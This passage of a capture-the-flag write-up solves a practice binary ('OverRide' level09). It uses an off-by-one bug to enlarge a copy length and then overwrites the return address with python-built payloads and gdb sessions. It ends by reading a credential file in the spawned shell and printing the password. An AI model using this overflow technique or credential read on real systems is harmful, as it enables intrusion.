    char temp[1024];
    
    memset(temp, 0, 128);
    puts(">: Msg @Unix-Dude");
    printf(">>: ");
    fgets(temp, 1024, stdin);
    strncpy(var1->message, temp, var1->msglen);
}

void set_username(struct my_struct* var1)
{
    char temp[140]; // 0x90 - 0x4
    int count;
    
    memset(temp, 0, 16);
    puts(">: Enter your username");
    printf(">>: ");
    fgets(temp, 120, stdin);
    count = 0;
    while (count < 41 && temp[count]) {
		var1->username[count] = name[count];
		count +=1;
	}
}

void handle_msg()
{
    struct my_struct msg;
    
    memset(msg.username, 0, 40);
    msg.msglen = 140;
    set_username(&msg);
    set_msg(&msg);
    puts(">: Msg sent!");
}

int main()
{
        puts("--------------------------------------------\n|   ~Welcome to l33t-m$n ~    v1337        |\n--------------------------------------------");
    return 0;
}
```
Looking at the code, there may be a chance at overflowing `var1->msg` since `strncpy(var1->message, temp, var1->msglen);` does not copy the nullbyte over. However, there are no operations after that action so I dont this it affects the program.

However upon closer inspection, I noticed that in `set_username`, the while loop is ran 41 times instead of 40, which will cause an overwrite on the first byte of `var1->msglen` To verify this, we can look into GDB. As we can see, the first image contains the original value in the rdx register, but the second image shows the overwritten value.

```
# prep input
python -c "print 'B' * 41 + '\n' + 'i' * 100" > /tmp/level09

# launch gdb
gdb level09
b *0x00005555555549c6
lay asm
focus cmd
tty /dev/pts/1
set disassembly-flavor intel
run < /tmp/level09
```
![image](https://hackmd.io/_uploads/B13p_0-Dp.png)

![image](https://hackmd.io/_uploads/H1XHuRWwp.png)

Now, if we change rdx to `0xff` or 255, we should be able to overflow the message variable later when we strncpy in `set_msg`. 

```
# prep input
python -c "print '\xff' * 41 + '\n' + 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4'" > /tmp/level09

# launch gdb
gdb level09
b *0x55555555491f
b *0x555555554924
lay asm
focus cmd
tty /dev/pts/1
set disassembly-flavor intel
run < /tmp/level09
```

We did infact override the EIP, and the offset was [200](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/?eip-length=100&eip-output-string=Output+string+goes+here). Now we add the address of `secret_backdoor` and we should be finished.

```
# prep input
python -c "print '\xff' * 41 + '\n' + 'B' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1]" > /tmp/level09

# launch gdb
gdb level09
b *0x55555555491f
b *0x555555554924
lay asm
focus cmd
tty /dev/pts/1
set disassembly-flavor intel
run < /tmp/level09
```

```
level09@OverRide:~$ (python -c "print '\xff' * 41 + '\n' + 'B' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1]" ; cat ) | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
>>: >: Msg sent!
/bin/sh
whoami
end
pwd
/home/users/level09
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE

```
The password for the end user is `j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE`
